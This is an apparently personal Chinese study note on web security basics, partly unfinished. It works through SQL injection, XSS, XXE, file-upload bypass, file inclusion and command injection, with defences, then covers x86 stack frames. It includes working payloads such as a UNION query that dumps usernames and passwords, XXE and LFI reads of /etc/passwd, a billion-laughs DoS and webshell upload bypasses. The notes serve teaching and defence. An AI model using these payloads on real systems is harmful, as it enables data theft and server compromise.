<p align="center" >
<font size="6">
    <strong>从 0 开始入门网络安全</strong>
</font>
</p>

# 摘要

<hr>

**文章索引**  

[TOC]

<hr>

# 前言
网络安全综述和网络安全法

# 1 基础知识

## 1.1 一些概念

### 黑客攻击
黑客攻击的一般过程：

1. 踩点
2. 扫描
3. 查点
4. 访问/拒绝服务
5. 提权
6. 窃取信息
7. 淹没踪迹
8. 建立后门

### 渗透测试
渗透测试的一般过程：

1. 前期交互阶段
2. 情报搜集阶段
3. 威胁建模阶段
4. 漏洞分析阶段
5. 渗透攻击阶段
6. 后渗透攻击阶段
7. 报告阶段

### 代码审计的目标确认
1. 明确审计代码语言
2. 明确审计代码使用的技术栈
3. 确认代码审计流程
4. 审计需要的工具、环境准备

### 代码审计和渗透测试的区别

* 渗透测试是黑盒，研究来自外部的入侵；代码审计是白盒，研究系统本身的漏洞和问题
* 渗透测试是，模拟黑客入侵过程，代码审计是发现程序中的不安全代码
* 渗透测试目标包括但不局限于 Web 系统，代码审计基于代码发现系统安全漏洞
  
渗透测试优点：贴近实际场景，远程渗透；缺点：不全面，修复成本高
代码审计优点：全面审查代码，贴近系统和架构，修复成本低；缺点：现场审计。

## 1.2 TCP/IP 协议
[计算机网络_传输层](cs/计算机网络/计算机网络_传输层.md)

## 1.3 Web 与 HTTP 协议
[计算机网络_应用层](cs/计算机网络/计算机网络_应用层.md)

### 1.3.1 Web
万维网(World Wide Web,WWW)简称 Web，是使用超文本传输协议(HTTP)传输网站页面和资源的一种网络应用层表现形式。  
Web 的基本结构可以简化为：  
Web 浏览器 $\longleftrightarrow$ Web 服务器 $\longleftrightarrow$ 数据库服务器

* 常见的 Web 浏览器：Google Chrome、Mozilla Firefox、MS IE、MS Edge、Opera 等。
* 提供 Web 服务的应用：Apache、Tomcat、Nginx、IIS 等。
* 提供数据库服务的应用：Oracle、MySQL、Redis、SQLite 等。

### 1.3.2 HTTP 协议
超文本传输协议，

get 和 post     

Session 和 Cookie

### 1.3.3 HTML 与 CSS 基础
参考：[HTML 与 CSS](cs/HTML%20与%20CSS.md)

### 1.3.4 PHP 基础
参考：[PHP](cs/PHP.md)  

# 2 Web 攻击与防御

## 2.1 基于搜索引擎的信息收集

### 2.1.1 Google

### 2.1.2 Zoomeye

### 2.1.3 Shodan


## 2.2 端口扫描与漏洞分析

### 2.2.1 Nmap

### 2.2.2 Burpsuite

### 2.2.3 AWVS

## 2.3 SQL 注入 

### 基于报错注入

**漏洞成因**   
未对 SQL 查询语句进行特殊字符的转义以及敏感词的过滤。

**漏洞利用**   

```sql
注入单引号、双引号、单引号加右括号等判断是否存在注入点

order by 3 %23
判断有多少列

union select 1,2,3 %23
判断数据回显位置

union select 1,user(),database() %23
显示出登录用户和数据库名

union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23
查询所有数据库名称

union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 %23
查询 security 库中所有表名

union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 %23
查询 users 表中所有列名

union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) %23
查所有 username 和 password 字段
```

**防护**    
将数据与命令、查询分割开。

1. 最安全的策略，使用安全的 API 进行数据的存取和读写，避免将查询语句和数据连接起来。
2. 使用白名单的服务器输入验证。
3. 对查询语句的特殊字符进行转义，譬如 PHP 中使用函数 `mysqli _real_escape()` 函数。

### 基于 HTTP header 与 Cookie 注入

### 盲注

## 2.4 XSS 漏洞
攻击者能在被攻击者的浏览器中执行脚本，并劫持会话、破坏网站或将用户重定向到恶意站点。

### 反射型 XSS
最简单的：

```php
<?php
    $str = $_GET['name'];
    echo '<p>' . $str . '欢迎您 </p>';
?>
```

注入 `?str=<script>alert(1)</script>`，可使得前端弹窗。

另一种是通过表单注入 XSS，比如：

```php
//demo.php
<?php
    $str = $_GET['input'];
?>
<html>
    <form action=demo.php  method="get">
        <input name="input" value="'.$str.'"/>
        <input type="submit" value="submit"/>
    </form>
</html>
```

注入 `test"><script>alert(1)</script>`，提前将 <" 闭合，则可在前端弹窗。

使用 `htmlspecialchars()` 函数可以使得下列特殊字符被转义成 HTML 实体：

* & $\longrightarrow$ \&amp
* " $\longrightarrow$ \&quot
* < $\longrightarrow$ \&lt
* \> $\longrightarrow$ \&gt
* ' $\longrightarrow$ \&apos（默认不转义）

可一定程度上防止 XSS，但无法完全防御，使用 onclick、oninput、onmouseover 等 JS 事件依然可以完成弹窗，例如：

```php
//demo.php
<?php
    $str = htmlspecialchars($_GET['input']);
?>
<html>
    <form action=demo.php  method="get">
        <input name="input" value='".$str."'/>
        <input type="submit" value="submit"/>
    </form>
</html>
```
`$str` 被 `htmlspecialchars()` 函数转义，但是使用 payload：`test' onmouseover='alert(1)'` 依然可以完成弹窗。

### 存储型 XSS
将脚本注入并存储在数据库中，当前端读取这段数据时执行脚本。常见的发生场景如评论区、留言板、个性签名等。

### DOM 型 XSS

**防护**   
使用 `htmlentities(string, flags, character-set, double_encode)` html 实体转换函数：

* string 表示要转换的字符串
* flags 表示如何处理引号、无效的编码以及使用哪种文件类型
* character-set 要使用的字符集
* double_encode 是否编码已经存在 html 实体类


## 2.5 XXE 漏洞
XML 是一种常用于存储和传输数据的标记语言，与 HTML 类似是通过标签组成文件的内容，但是 XML 的标签没有被预定义，而是用户自行定义标签。     
XML 外部实体即在 XML 文件中引用外部的资源。

### 文件读取
XML 定义外部实体的用法如下：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<message>
    <user>&xxe;</user>
</message>
```

上述 XML 引用外部实体 file:///etc/passwd，则将读取该文件的内容。    

### 拒绝服务
使用 XML 外部实体可以实现 DoS 攻击，例如：

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

lol 是一个实体，内容为“lol”，lol2 实体引用 10 个 lol 实体，lol3 实体又引用了 10 个 lol2 实体，一直到 lol9，如此就会引用上亿个 lol 实体，XML 解析器将整个结构保存在内存中造成 DoS 攻击。

也可以使用 /dev/random 造成 DoS 攻击：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
<message>
    <user>&xxe;</user>
</message>
```
/dev/random 是 Linux 系统中提供的随机伪设备，提供永不为空的随机字节数据流。

**防护**    

* 尽可能使用简单的数据格式存储和和传输数据，如 json，避免对敏感数据进行序列化
* 及时修复和更新应用程序或操作吸引使用的 XML 处理器和库
* 在 XML 解析器中禁用外部实体和 DTD 进程
* 在服务器端使用白名单进行过滤和验证

## 2.6 文件上传漏洞

### 前端检验

```js
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

将 Webshell 后缀改为 .jpg，上传 Webshell，使用 Burpsuite 抓包，修改文件后缀为 .php 即可绕过。

### MIME 类型检验

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
?>
```

`if (($_FILES['upload_file']['type'] == 'image/jpeg'))` 表明使用了 MIME 检测文件类型。上传 Webshell，使用 Burpsuite 抓包，修改 Content-type 类型，使脚本能够绕过。


### 黑名单绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

黑名单过滤了 .asp .php .aspx .jsp 四种后缀，而 PHP 文件的后缀名除了 .php 外，还有 .pht | .phpt | .phtml | .php3 | .php4 | .php5 | .php6 等，可利用不常见的后缀名绕过黑名单。  
修改文件的后缀名为 .php4 即可绕过黑名单。

### .htaccess 绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

此段代码也使用黑名单过滤上传的文件，过滤的文件后缀很多，无法通过不常见的后缀名绕过。但是可以通过上传 apache 的 .htaccess 文件：

``` htaccess
<FilesMatch "upload.png">  
    SetHandler application/x-httpd-php  
</FilesMatch>
```

该 .htaccess 文件可以将 .png 后缀的文件作为 PHP 文件解析。

### 大小写绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
}
?>
```

此段代码仍使用黑名单过滤，也过滤了 .htaccess 文件。审查代码发现没有将文件名转化为小写，故可以将后缀名改为大小写绕过黑名单，如 .PHp，即可绕过。

### 空格绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

此段代码仍使用黑名单过滤，也过滤了 .htaccess 文件，审查代码发现可以使用空格绕过黑名单，因为在 Windows 系统下，后缀名之后的空格会被无视。上传 Webshell 文件，使用 Burpsuite 抓包，把文件的后缀名后加一个空格，即可绕过。

**防护**

## 2.7 文件包含漏洞
PHP 有四种文件包含方式：

* `include`
* `include_once`
* `require`
* `require_once`

其中 `include` 和 `require` 的区别是，二者处理错误的方式不同，前者生成一个警告，出错后脚本继续执行，后者生成一个致命错误，脚本停止执行。  
后面带上 `_once` 的作用是如果之前已经包含了该文件，则不会再次包含，即防止多次包含同一个文件。  

### 本地文件包含
PHP 包含文件时不会在意文件的类型，都会当作 PHP 代码执行，故可以通过改变包含的文件请求来读取系统中的敏感文件，譬如代码：

```php
<?php
    include($_GET['file']);
?>
```

URL 注入 `?file=/etc/passwd`，可读取系统的密码文件。
通过 PHP 伪协议 php://filter 可进行任意文件的读取。

### 远程文件包含
若 PHP 配置中 allow_url_include、allow_url_fopen 选项配置为 on，则可直接进行远程文件包含。如在 URL 注入：`?file=http://192.168.17.138/code.txt` 可直接远程读取该文件。

## 2.8 代码执行漏洞
**漏洞成因**     
PHP 中可以调用系统命令函数：

* `system()`：执行系统命令，输出执行结果。
* `passthru()`：与 `system()`函数相似。
* `exec()`：执行系统命令，无回显，返回最后一行结果。
* `shell_exec()`：执行系统命令，返回完整的输出结果。
* `popen(command, mode)`：command 为执行的命令，mode 规定连接模式，可以是 r（只读）、w（只写）等。
* `proc_open()`：不直接返回执行结果，返回一个文件指针。
* `pcntl_exec()`：执行发生错误返回 FALSE，无错误不返回。

命令执行的例子：

```php
<?php
    $ip = $_GET["ip"];
    $command = "ping -c 3 $ip";
    system("$command");
?>
```

以上代码存在代码执行漏洞，攻击者可以使用命令连接符连接自己想要执行的系统命令，如注入 `?ip = 127.0.0.1 | pwd` 可显示当前网页在服务器中的路径。

**防护**

* `escapeshellarg()` 函数：给字符串增加一个单引号且能够引用或者转码任何已经存在的单引号，以确保能够直接将一个字符串传入 shell 函数。
* `escapeshellcmd()` 函数：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，保证用户输入的数据在传送到 `exec()` 函数或执行操作符前进行转义。
* 黑名单过滤特殊字符或替换字符。

## 2.9 CSRF 漏洞

## 2.10 SSRF 漏洞

## 2.11 不安全的反序列化

## 2.12 失效的身份验证
错误的使用应用程序的身份验证和会话管理，使攻击者能够破译密码、密钥或会话令牌，或利用其他缺陷暂时性或永久性冒充他人身份。

**漏洞成因**

* 允许凭证填充（撞库攻击）
* 允许暴力破解或自动攻击
* 允许默认的、弱的口令，如 admin
* 使用弱的或失效的验证凭证恢复程序、忘记密码程序，例如“基于知识的问答”
* 使用明文或弱散列算法加密存储密码
* 缺少或失效的多因素身份验证
* 在 URL 中暴露会话 ID
* 登录成功后不更新会话
* 用户不活跃时，会话 ID 没有失效

**防护**

* 多因素验证，防止凭证填充、暴力破解和自动攻击以及被盗凭证再利用攻击
* 不使用任何默认凭据进行部署，尤其管理员账户
* 执行弱密码检查，设置合适的密码长度、复杂性和轮换策略
* 限制或增加登录失败延时，记录失败信息，检测凭据填充、暴力破解等攻击并提醒管理员
* 使用安全的会话管理器，在登录后生成高度复杂的新随机会话 ID，避免会话 ID 暴露在 URL

## 2.13 敏感信息泄露
**漏洞成因**    
许多 Web 应用以及 API 无法保护敏感数据，没有对其进行加密，如财务数据、医疗信息等个人敏感信息。导致攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份窃取或其他犯罪行为。   

**防护**   
应对下面三种敏感数据进行加密：

* 传输过程的数据（不能明文传输）
* 存储的数据（不能明文存储）
* 浏览器交互的数据

措施：
* 对系统处理、传输和存储的数据进行分类，根据分类进行访问控制
* 熟悉与敏感数据保护相关的法律和规章
* 对于没有必要存在的敏感数据，应尽快清除，或使用 PCI DSS 进行标记和拦截
* 确保存储的敏感数据被加密
* 确保使用密码专用算法存储密码，如 PBKDF2、bcrypt、script 等
* 确保使用最新的、安全系数高的加密算法，并管理好密钥
* 确保在传输过程的数据被加密，如使用 TLS。确保数据加密被强制执行，如使用 HTTP 严格安全传输协议 HSTS
* 禁止缓存包含敏感数据的响应

## 2.14 失效的访问控制
**漏洞成因**  
未对用户实施恰当的访问控制，攻击者可以访问未经授权的功能或数据：
* 访问其他用户账户
* 查看敏感文件
* 修改其他用户的数据
* 更改访问权限

**防护**

* 除公有资源外，默认为“拒绝访问”
* 使用一次性访问控制机制，最小化跨源资源共享的使用
* 特别的业务应用访问限制应由领域模型强制执行
* 禁用 Web 服务器目录列表，确保文件元数据和备份文件不在 Web 的根目录中
* 记录失败的访问控制并提醒管理员
* 在用户注销后，会话的 ID 应当失效，无状态的 JWT 令牌应该是短暂的，使攻击者的攻击机会窗口最小化

## 2.15 安全配置错误
**漏洞成因**      

* 不安全的默认配置
* 不完整的临时配置
* 开源云存储
* 错误的 HTTP 报头配置
* 包含敏感信息的详细错误信息

**防护**     
不仅要对操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级。

# 3 逆向工程 

## 3.1 函数调用栈帧

一个程序并不是连续的存放在之中，而是分散在不同的内存区之中：

|区域|作用|
|-|-|
|栈区 stack|存放函数的参数值，局部变量值，由编译器进行分配和释放。|
|堆区 heap|通过 malloc、new 等方式分配的内存块，编译器不会进行释放，由程序员进行分配和释放。|
|未初始化的数据区 .bass|存放未初始化的或初始化为 0 的全局变量和静态变量。|
|已初始化的数据区 .data|存放已经初始化的全局变量和静态变量。|
|文字常量区 .rodata|常量字符串放在此，程序结束后由编译器释放。|
|程序代码区 .text|存放程序的二进制代码。|

![](image/Pasted%20image%2020220526153112.png)

**栈区**是由高地址向低地址延申的，栈区类似于数据结构中的栈，有**栈顶**和**栈底**，只允许在栈顶压入或取出数据。   
**栈帧**是函数的执行环境，每次函数调用都有一个栈帧，维持函数的执行所需的各种信息。栈帧需要用到的寄存器：
 
|寄存器|作用|
|-|-|
|eax|累加(Accumulator)寄存器，常用于函数返回值。|
|ebx|基址(Base)寄存器，作为基地址访问内存。|
|ecx|计数器(Counter)寄存器，常用于字符串和循环操作的计数器。|
|edx|数据(Data)寄存器，常用于乘除法和 I/O 指针。|
|esi|源变址寄存器。|
|dsi|目的变址寄存器。|
|esp|堆栈(Stack)寄存器，指向堆栈顶。|
|ebp|基址指针寄存器，指向当前堆栈的底部。|
|eip|指令(Instructor)寄存器，指向下一条指令的地址。|

**常用的汇编指令：**    

|汇编指令|用途|
|-|-|
|mov|mov A, B 将 B 的内容赋给 A|
|push|压栈|
|pop|出栈|
|call|函数调用|
|add|加法|
|sub|减法|
|rep|重复|
|lea|将有效地址传送到指定的寄存器|

栈帧的大致结构：

```text
push   ebp        //函数开始，保存上一个栈帧的 ebp
mov    ebp, esp   //将当前栈帧的 ebp 指向上一个栈帧的 esp
sub    esp, x     //x 为一个数值，表示开辟的栈空间大小


......            //函数主体


mov    esp, ebp   //将函数的其实地址返回到 esp 中
pop    ebp        //函数返回前弹出保存在栈中的 ebp 值
以上两步等价于 leave
ret               //函数终止
```

例如 C 语言程序：

```c
//demo.c
#include <stdio.h>

int add(int x, int y) {
    int z = 0;
    z = x + y;
    return z;
}

int main() {
    int a = 10;
    int b = 20;
    int c = add(a, b);
    return 0;
}
```

在 gcc 环境下编译并使用 gdb 反汇编：

```text
gcc -fno-stack-protector -o demo demo.c
gdb ./demo
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x00001279 <+0>:     push   ebp
   0x0000127f <+6>:     call   0x12af <__x86.get_pc_thunk.ax>
   0x00001284 <+11>:    add    eax,0x2d4c
   0x00001289 <+16>:    mov    DWORD PTR [ebp-0x4],0x1
   0x00001290 <+23>:    mov    DWORD PTR [ebp-0x8],0x3
   0x00001297 <+30>:    push   DWORD PTR [ebp-0x8]
   0x0000129a <+33>:    push   DWORD PTR [ebp-0x4]
   0x0000129d <+36>:    call   0x1252 <add>
   0x000012a2 <+41>:    add    esp,0x8
   0x000012a8 <+47>:    mov    eax,0x0
   0x000012ad <+52>:    leave  
   0x000012ae <+53>:    ret    
End of assembler dump.
(gdb) disas add
Dump of assembler code for function add:
   0x00001252 <+0>:     push   ebp
   0x00001253 <+1>:     mov    ebp,esp
   0x00001255 <+3>:     sub    esp,0x10
   0x00001262 <+16>:    mov    DWORD PTR [ebp-0x4],0x0
   0x00001269 <+23>:    mov    edx,DWORD PTR [ebp+0x8]
   0x0000126c <+26>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0000126f <+29>:    add    eax,edx
   0x00001271 <+31>:    mov    DWORD PTR [ebp-0x4],eax
   0x00001274 <+34>:    mov    eax,DWORD PTR [ebp-0x4]
   0x00001277 <+37>:    leave  
   0x00001278 <+38>:    ret    
End of assembler dump.
```

> 注意：上述代码在使用 gcc 编译的时候使用了 -fno-stack-protector 参数关闭了栈保护机制，以此展示更原始的栈帧。

**调用一个函数时的操作步骤：**

1. **调用方**将**被调用函数**所需的参数放入到函数所采用的**调用约定**指定的位置。
2. **调用方**将控制权转交给被**调用函数(call)**，然后返回地址被保存在程序栈或 CPU 寄存器中。
3. **被调用函数**为局部变量分配空间。
4. **被调用函数**指向操作。
5. **被调用函数**完成操作，释放局部变量的栈空间。
6. **被调用函数**将控制权返还给**调用方(retn)。**

**调用约定：**  

1. 32 位调用约定

|调用约定|约定名称|参数传递顺序|堆栈清理|说明|
|-|-|-|-|-|
|__cdecl|C 调用约定|从右至左入栈|**调用方清理**|C 代码子程序，适合参数可变的函数，如 printf|
|__stdcall|（微软）标准调用约定|从右至左入栈|被调用方清理|只适合参数个数固定的函数，微软对所有 ddl 文件参数固定的函数使用该方式|
|__fastcall|x86 fastcall 约定|前两个参数传入 ecx 和 edx，其他从右至左入栈|被调用方|不定参数的函数无法使用|
| __thiscall|C++ 非静态成员函数的默认调用约定|从右至左入栈|被调用方|MSVC++ 的调用约定，隐含的 this 指针存放于 ecx|

2. 64 位调用约定

|调用约定|操作系统|参数传递顺序|堆栈清理|
|-|-|-|-|
|x64 调用约定|Windows|前四个参数分别使用 rcx rdx r8 r9 存放，剩余从右至左入栈，返回值存放在 eax|调用方|
|x64调用约定|Linux macOS|前六个参数分别使用 rdi rsi rdx rcx r8 r9 存放，其他从右至左入栈，返回值放在 rax |调用方|

3.  非优化  
函数对参数和局部变量的存取都是通过栈来定义的，非优化的编
泽器用奇存器 ebp 对参数进行寻址，即 **“ebp指针+偏移量”。**

4. 优化  
为了节省 ebp 寄存器或尽量减少代码以提高速度，会使用 **esp** 对参数进行寻址（esp 的值在有数据进出栈时都会有变）。

**栈保护机制：**
canary 金丝雀保护机制，在函数调用之前在栈帧中插入一个随机数值，在调用返回时检查该数值有没有被覆盖，若被覆盖，可能发生了栈溢出。

## 3.2 栈溢出


## 3.3 堆溢出


# 4 提权

# 5 加密算法

# 6 消息认证和数字签名